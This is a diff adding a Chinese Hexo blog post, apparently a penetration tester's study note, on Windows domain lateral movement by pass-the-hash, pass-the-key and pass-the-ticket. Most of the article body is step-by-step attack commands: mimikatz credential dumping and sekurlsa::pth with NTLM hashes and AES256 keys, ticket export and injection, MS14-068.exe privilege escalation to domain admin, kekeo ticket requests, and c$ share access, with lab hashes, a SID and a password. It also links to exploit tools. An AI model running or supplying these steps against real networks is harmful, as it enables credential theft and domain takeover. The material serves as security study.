@@ -1,0 +1,282 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>域横向PTH&amp;PTK&amp;PTT哈希票据传递 | 1ceC0la's blog</title><meta name="keywords" content="渗透测试,内网安全"><meta name="author" content="1ceC0la"><meta name="copyright" content="1ceC0la"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="知识点PTH&amp;PTT&amp;PTKPTH(pass the hash)         利用lm或ntlm的值进行的渗透测试 PTT(pass the ticket)        利用的票据凭证TGT进行的渗透测试 PTK(pass the key)           利用的ekeys aes256进行的渗透测试 PTH和PTKPTH原理是攻击者可以直接通过LM Hash和NTLM">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域横向PTH&amp;PTK&amp;PTT哈希票据传递">
+<meta property="og:url" content="http://example.com/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/index.html">
+<meta property="og:site_name" content="1ceC0la&#39;s blog">
+<meta property="og:description" content="知识点PTH&amp;PTT&amp;PTKPTH(pass the hash)         利用lm或ntlm的值进行的渗透测试 PTT(pass the ticket)        利用的票据凭证TGT进行的渗透测试 PTK(pass the key)           利用的ekeys aes256进行的渗透测试 PTH和PTKPTH原理是攻击者可以直接通过LM Hash和NTLM">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg9.51tietu.net%2Fpic%2F2019-091301%2Fqz0koirn0u1qz0koirn0u1.jpg&refer=http%3A%2F%2Fimg9.51tietu.net&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1644051487&t=d175a25b5fbdd3eed194511a7a170807">
+<meta property="article:published_time" content="2022-03-11T13:43:00.000Z">
+<meta property="article:modified_time" content="2022-03-11T13:43:00.000Z">
+<meta property="article:author" content="1ceC0la">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="内网安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg9.51tietu.net%2Fpic%2F2019-091301%2Fqz0koirn0u1qz0koirn0u1.jpg&refer=http%3A%2F%2Fimg9.51tietu.net&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1644051487&t=d175a25b5fbdd3eed194511a7a170807"><link rel="shortcut icon" href="/img/avatar.gif"><link rel="canonical" href="http://example.com/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&amp;PTK&amp;PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '域横向PTH&PTK&PTT哈希票据传递',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-11 21:43:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.gif" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heartbeat"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 图库</span></a></li><li><a class="site-page child" href="/%E9%82%A3%E4%BA%9B%E5%B9%B4-%E6%88%91%E7%9C%8B%E8%BF%87%E7%9A%84%E7%94%B5%E5%BD%B1/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About me</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg9.51tietu.net%2Fpic%2F2019-091301%2Fqz0koirn0u1qz0koirn0u1.jpg&amp;refer=http%3A%2F%2Fimg9.51tietu.net&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1644051487&amp;t=d175a25b5fbdd3eed194511a7a170807')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">1ceC0la's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heartbeat"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 图库</span></a></li><li><a class="site-page child" href="/%E9%82%A3%E4%BA%9B%E5%B9%B4-%E6%88%91%E7%9C%8B%E8%BF%87%E7%9A%84%E7%94%B5%E5%BD%B1/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About me</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">域横向PTH&amp;PTK&amp;PTT哈希票据传递</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-11T13:43:00.000Z" title="发表于 2022-03-11 21:43:00">2022-03-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-11T13:43:00.000Z" title="更新于 2022-03-11 21:43:00">2022-03-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="域横向PTH&amp;PTK&amp;PTT哈希票据传递"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="PTH-amp-PTT-amp-PTK"><a href="#PTH-amp-PTT-amp-PTK" class="headerlink" title="PTH&amp;PTT&amp;PTK"></a>PTH&amp;PTT&amp;PTK</h3><p>PTH(pass the hash)         利用<strong>lm或ntlm</strong>的值进行的渗透测试</p>
+<p>PTT(pass the ticket)        利用的<strong>票据凭证TGT</strong>进行的渗透测试</p>
+<p>PTK(pass the key)           利用的<strong>ekeys aes256</strong>进行的渗透测试</p>
+<h3 id="PTH和PTK"><a href="#PTH和PTK" class="headerlink" title="PTH和PTK"></a>PTH和PTK</h3><p>PTH原理是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。</p>
+<p>如果禁用了ntlm认证，PsExec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1/2012r2，安装补丁kb2871997的Win 7/2008r2/8/2012等，可以使用AES keys代替NT hash来实现ptk攻击</p>
+<h4 id="总结KB2871997补丁后的影响"><a href="#总结KB2871997补丁后的影响" class="headerlink" title="总结KB2871997补丁后的影响"></a>总结KB2871997补丁后的影响</h4><p>PTH：没打补丁用户都可以连接，打了补丁只能administrator远程ipc连接</p>
+<p>PTK：打了补丁才能用户都可以连接，采用aes256连接</p>
+<p>查看补丁：用<code>systeminfo</code>命令</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/220740.html">KB22871997是否真的能防御PTH攻击</a></p>
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220311233849808.png" alt="image-20220311233849808"></p>
+<h3 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h3><p>PTT攻击的部分就不是简单的NTLM认证了，它是利用<strong>Kerberos协议</strong>进行攻击的，这里就介绍三种常见的攻击方法：<strong>MS14-068</strong>，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。</p>
+<p>MS14-068基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)</p>
+<p>其中Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术</p>
+<p>MS14-068造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780</p>
+<h4 id="Kerberos协议工作方法"><a href="#Kerberos协议工作方法" class="headerlink" title="Kerberos协议工作方法"></a>Kerberos协议工作方法</h4><p>客户机将明文密码进行NTLM哈希,然后和时间戳一起加密（使用krbtgt密码hash作为密钥），发送给kdc（域控），kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)。</p>
+<p>将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据。</p>
+<p>然后客户机将TGT发送给域控制器KDC请求TGS（票证授权服务）票证，并且对TGT进行检测。</p>
+<p>检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机。</p>
+<h2 id="域横向移动PTH传递-mimikatz"><a href="#域横向移动PTH传递-mimikatz" class="headerlink" title="域横向移动PTH传递-mimikatz"></a>域横向移动PTH传递-mimikatz</h2><p>使用mimikatz先获取hash（假设获取到的就是域控的ntlm）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220311230845494.png" alt="image-20220311230845494"></p>
+<p>在未打补丁的工作组及域连接：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7</span><br><span class="line"><span class="comment"># domain的值为workgroup时，连接的是本地用户</span></span><br></pre></td></tr></table></figure>
+
+<p>成功会自动创建一个cmd，可以通过该cmd操作对应用户名的机器，如查看C盘目录(若IP地址不识别可以换成计算机名)</p>
+<pre><code>dir \\192.168.3.21\c$
+</code></pre>
+<p>注意：这里/domain:god.org是对域内用户进行PTH，我理解的是经过操作后弹出的cmd具有对域内主机PTH的功能，所以还需要在弹出的cmd中测试出哪个或哪些主机对应该ntlm值(另外用户名也是不确定的)</p>
+<h2 id="域横向移动PTK传递-mimikatz"><a href="#域横向移动PTK传递-mimikatz" class="headerlink" title="域横向移动PTK传递-mimikatz"></a>域横向移动PTK传递-mimikatz</h2><p>打补丁后的工作组及域连接：</p>
+<p>mimikatz获取权限</p>
+<pre><code>privilege::debug
+</code></pre>
+<p>之后获取aes值</p>
+<pre><code>sekurlsa::ekeys
+</code></pre>
+<p>ptk传递</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sekurlsa</span>::pth /user:mary /domain:god.org /aes<span class="number">256</span>:d<span class="number">7</span>c<span class="number">1</span>d<span class="number">9310753</span>a<span class="number">2</span>f<span class="number">7</span>f<span class="number">24035</span>b<span class="number">2701</span>dc<span class="number">1</span>e<span class="number">6177</span>d<span class="number">16</span>a<span class="number">6</span>e<span class="number">40</span>af<span class="number">3</span>c<span class="number">5</span>cdff<span class="number">814719821</span>c<span class="number">4</span>b</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="域横向移动PTT传递-MS14068-amp-kekeo-amp-local"><a href="#域横向移动PTT传递-MS14068-amp-kekeo-amp-local" class="headerlink" title="域横向移动PTT传递-MS14068&amp;kekeo&amp;local"></a>域横向移动PTT传递-MS14068&amp;kekeo&amp;local</h2><h4 id="第一种利用漏洞ms14-068"><a href="#第一种利用漏洞ms14-068" class="headerlink" title="第一种利用漏洞ms14-068"></a>第一种利用漏洞ms14-068</h4><p>能实现普通用户直接获取域控system权限</p>
+<p>1.查看当前sid</p>
+<pre><code>whoami /user
+</code></pre>
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312001825724.png" alt="image-20220312001825724"></p>
+<p>2.启动mimikatz，<strong>不需要提升权限</strong>，能用就行</p>
+<p>清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</p>
+<pre><code>kerberos::purge
+</code></pre>
+<p>查看当前机器凭证</p>
+<pre><code>kerberos::list
+</code></pre>
+<p>将票据注入到内存中</p>
+<pre><code>kerberos::ptc 票据文件
+</code></pre>
+<p>3.利用ms14-068生成TGT数据</p>
+<pre><code>ms14-068.exe -u 域成员名@域名 -s sid -d 域控IP地址 -p 域成员密码
+
+# 例
+MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 - p admin!@#45
+</code></pre>
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312001958899.png" alt="image-20220312001958899"></p>
+<p>4.票据注入内存</p>
+<pre><code>kerberos::ptc TGT_mary@god.org.ccache
+</code></pre>
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312002203743.png" alt="image-20220312002203743"></p>
+<p>5.查看凭证列表</p>
+<pre><code>klist
+</code></pre>
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312002227026.png" alt="image-20220312002227026"></p>
+<p>6.利用</p>
+<pre><code>dir \\主机名\c$
+</code></pre>
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312002420045.png" alt="image-20220312002420045"></p>
+<p>这里是对域控攻击所以net time /domain查主机名</p>
+<h3 id="第二种利用工具kekeo"><a href="#第二种利用工具kekeo" class="headerlink" title="第二种利用工具kekeo"></a>第二种利用工具kekeo</h3><p>1.生成票据</p>
+<pre><code>./kekeo &quot;tgt::ask /user:域成员名 /domain:域名 /ntlm:ntlm值&quot;
+
+./kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695d……&quot;
+</code></pre>
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312003010504.png" alt="image-20220312003010504"></p>
+<p>2.导入票据</p>
+<pre><code>kerberos::ptt 票据文件
+
+kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi
+</code></pre>
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312003037687.png" alt="image-20220312003037687"></p>
+<p>3.查看凭证</p>
+<pre><code>klist
+</code></pre>
+<p>4.利用net use载入</p>
+<pre><code>dir \\192.168.3.21\c$
+</code></pre>
+<h3 id="第三种利用本地票据（需管理权限）"><a href="#第三种利用本地票据（需管理权限）" class="headerlink" title="第三种利用本地票据（需管理权限）"></a>第三种利用本地票据（需管理权限）</h3><p>利用<strong>mimikatz</strong>收集本地票据，再将票据导入到内存中进行连接。有存活时间限制（之前有人用这台被拿下的主机连结过域控，就会存在相关凭据，我们的目的就是导出所有凭据，找到与连结过域控的凭据）</p>
+<pre><code>privilege::debug
+
+sekurlsa::tickets /export
+
+kerberos::ptt 票据文件
+</code></pre>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>ptt传递不需本地管理员权限，连接时主机名连接，基于漏洞、工具、本地票据</p>
+<h2 id="国产Ladon内网杀器测试-信息收集，连接等"><a href="#国产Ladon内网杀器测试-信息收集，连接等" class="headerlink" title="国产Ladon内网杀器测试-信息收集，连接等"></a>国产Ladon内网杀器测试-信息收集，连接等</h2><p>信息收集-协议扫描-漏洞探针-传递攻击等</p>
+<p>“Wiki”界面有命令介绍</p>
+<p>信息收集</p>
+<p>GUI：“scan”界面选“scan”，“OnlinePC”界面右键选“OnlinePC”扫描</p>
+<p>命令行：Ladon [网段] [关键词]</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/10355979.html">内网渗透之PTH&amp;PTT&amp;PTK</a></p>
+<p>Kerberos协议工作原理：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32005671/article/details/54862678">https://blog.csdn.net/qq_32005671/article/details/54862678</a></p>
+<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>Ladon：<a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p>
+<p>Ladon 9.1.1 &amp; CobaltStrike神龙插件发布：<a target="_blank" rel="noopener" href="http://k8gege.org/Ladon/cs911.html">http://k8gege.org/Ladon/cs911.html</a></p>
+<p>kekeo：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p>
+<p>WindowsExploits/MS14-068：<a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">1ceC0la</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&amp;PTK&amp;PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/">http://example.com/2022/03/11/内网安全-域横向PTH&amp;PTK&amp;PTT哈希票据传递/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">1ceC0la's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a></div><div class="post_share"><div class="social-share" data-image="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg9.51tietu.net%2Fpic%2F2019-091301%2Fqz0koirn0u1qz0koirn0u1.jpg&amp;refer=http%3A%2F%2Fimg9.51tietu.net&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1644051487&amp;t=d175a25b5fbdd3eed194511a7a170807" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/WeChatPay.png" target="_blank"><img class="post-qr-code-img" src="/img/WeChatPay.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.png" target="_blank"><img class="post-qr-code-img" src="/img/alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&amp;SPN&amp;RDP/"><img class="prev-cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">域横向CobaltStrike&amp;SPN&amp;RDP</div></div></a></div><div class="next-post pull-right"><a href="/2022/03/10/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91smb&amp;wmi%E6%98%8E%E6%96%87%E6%88%96hash%E4%BC%A0%E9%80%92/"><img class="next-cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">域横向smb&amp;wmi明文或hash传递</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/03/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-MSF%E5%92%8CCS%E8%81%94%E5%8A%A8/" title="MSF和CS联动"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg9.51tietu.net%2Fpic%2F2019-091301%2Fqz0koirn0u1qz0koirn0u1.jpg&refer=http%3A%2F%2Fimg9.51tietu.net&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1644051487&t=d175a25b5fbdd3eed194511a7a170807" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt 